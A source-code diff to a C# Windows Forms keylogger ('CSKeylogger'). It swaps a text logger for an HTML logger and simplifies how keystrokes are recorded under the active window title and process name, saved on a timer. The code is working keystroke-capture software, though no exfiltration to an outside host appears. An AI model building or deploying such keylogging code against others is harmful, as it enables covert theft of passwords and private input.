@@ -1,4 +1,5 @@
-﻿using System;
+﻿using KeyLogger.Loggers.Concrete;
+using System;
 using System.Collections;
 using System.Diagnostics;
 using System.IO;
@@ -12,14 +13,13 @@ namespace KeyLogger
     public partial class FrmMain : Form
     {
         private readonly Frmoptions _option;
-        private Stack _appNames;
         private bool _allowtoTik;
         private UserActivityHook _hooker;
 
         private int _tik;
         private bool _isLoggerOn;
 
-        private TextLogger _logger;
+        private HtmlLogger _logger;
 
         public FrmMain()
         {
@@ -56,8 +56,7 @@ namespace KeyLogger
             _hooker.OnMouseActivity += HookerMouseActivity;
             _hooker.Stop();
 
-            _logger = new TextLogger();
-            _appNames = new Stack();
+            _logger = new HtmlLogger();
         }
 
         public void HookerMouseActivity(object sender, MouseEventArgs e){}
@@ -103,13 +102,7 @@ namespace KeyLogger
                 string _appName = p.ProcessName;
                 string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                 string _thisapplication = _appltitle + "######" + _appName;
-                if (!_appNames.Contains(_thisapplication))
-                {
-                    _appNames.Push(_thisapplication);
-                    _logger.AddApplication(_thisapplication);
-                }
-
-                _logger.Update(_thisapplication, txt);
+                _logger.Log(_thisapplication, txt);
             }
             catch (Exception ex)
             {
@@ -148,7 +141,7 @@ namespace KeyLogger
         
         private void TimerLogsaverTick(object sender, EventArgs e)
         {
-            _logger.SaveLogfile(_logger.LogFilePath);
+            _logger.Save(_logger.LogFilePath);
         }
 
         private void mnuItem_Settings_Click(object sender, EventArgs e)
@@ -206,12 +199,12 @@ namespace KeyLogger
             var savef = new SaveFileDialog
                             {
                                 Title = "Save ...",
-                                Filter = "CSKeylogger log files (*.xml)|*.xml",
-                                FileName = "Logfile.xml"
+                                Filter = "CSKeylogger log files (*.html)|*.html",
+                                FileName = "Logfile.html"
                             };
             if (savef.ShowDialog() == DialogResult.OK)
             {
-                _logger.SaveLogfile(savef.FileName);
+                _logger.Save(savef.FileName);
             }
         }
 
